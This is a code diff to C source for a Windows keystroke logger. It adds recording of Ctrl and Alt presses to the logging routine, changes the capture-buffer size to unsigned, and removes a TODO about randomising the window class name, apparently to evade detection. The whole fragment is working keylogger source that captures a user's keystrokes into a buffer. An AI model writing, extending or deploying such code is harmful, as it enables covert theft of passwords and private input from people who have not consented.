@@ -1,8 +1,3 @@
-/*
- *	TODO:
- *	- randomize class name or think of something clever
- */
-
 #include "precomp.h"
 #include "raw.h"
 #include <tchar.h>
@@ -53,7 +48,7 @@ bool boom[1024];
 const char g_szClassName[] = "klwClass";
 HANDLE tKeyScan = NULL;
 char *key_scan_buf = NULL;
-int keyscan_size = 1024*1024;
+unsigned int keyscan_size = 1024*1024;
 unsigned int g_ksindex = 0;
 
 /*
@@ -278,6 +273,12 @@ int ui_log_key(UINT vKey)
             break;
         case VK_SHIFT:
             break;
+		case VK_LCONTROL:
+			g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<Ctrl>");
+			break;
+		case VK_MENU:
+			g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<Alt>");
+			break;
         default:
             if(ToAscii(vKey, MapVirtualKey(vKey, 0), lpKeyboard, &wKey, 0) == 1) {
                 g_ksindex += wsprintf(key_scan_buf + g_ksindex, "%c", (char)wKey);
